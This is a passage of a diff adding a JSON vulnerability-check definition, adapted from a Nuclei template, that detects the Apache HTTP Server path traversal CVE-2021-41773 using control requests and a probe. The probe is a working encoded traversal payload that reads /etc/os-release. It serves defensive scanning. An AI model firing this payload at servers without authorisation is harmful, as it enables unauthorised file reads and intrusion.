+    },
+    "tags": [
+      "readonly",
+      "verification",
+      "file_read",
+      "cve-2021-41773"
+    ],
+    "applies_to": [
+      "Apache HTTP Server"
+    ],
+    "source": "https://github.com/projectdiscovery/nuclei-templates/blob/17f5725dc10ced09f464dd2d255c19957aad51e7/http/cves/2021/CVE-2021-41773.yaml (MIT; reviewed read-only adaptation)",
+    "definition": {
+      "service": "http",
+      "condition": "and",
+      "requests": [
+        {
+          "role": "control",
+          "method": "GET",
+          "path": "/etc/os-release",
+          "headers": {
+            "Cache-Control": "no-store"
+          },
+          "condition": "and",
+          "matchers": [
+            {
+              "part": "body",
+              "type": "regex",
+              "regex": [
+                "(?m)^NAME=[^\\r\\n]+\\r?$",
+                "(?m)^ID=[^\\r\\n]+\\r?$"
+              ],
+              "condition": "or",
+              "negative": true,
+              "case_sensitive": true
+            }
+          ]
+        },
+        {
+          "role": "probe",
+          "method": "GET",
+          "path": "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/os-release",
+          "headers": {
+            "Cache-Control": "no-store"
+          },
+          "condition": "and",
+          "matchers": [
+            {
+              "part": "status",
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "part": "body",
+              "type": "regex",
+              "regex": [
+                "(?m)^NAME=[^\\r\\n]+\\r?$",
+                "(?m)^ID=[^\\r\\n]+\\r?$"
+              ],
+              "condition": "and",
+              "negative": false,
+              "case_sensitive": true
+            }
+          ]
+        },
+        {
+          "role": "control",
+          "method": "GET",
+          "path": "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shen-verification-nonexistent-74f986",
+          "headers": {
+            "Cache-Control": "no-store"
+          },
+          "condition": "and",
+          "matchers": [
+            {
+              "part": "body",
+              "type": "regex",
+              "regex": [
+                "(?m)^NAME=[^\\r\\n]+\\r?$",
+                "(?m)^ID=[^\\r\\n]+\\r?$"
+              ],
+              "condition": "or",
+              "negative": true,
+              "case_sensitive": true
+            }
+          ]
+        }
+      ]
+    }
+  }
+]
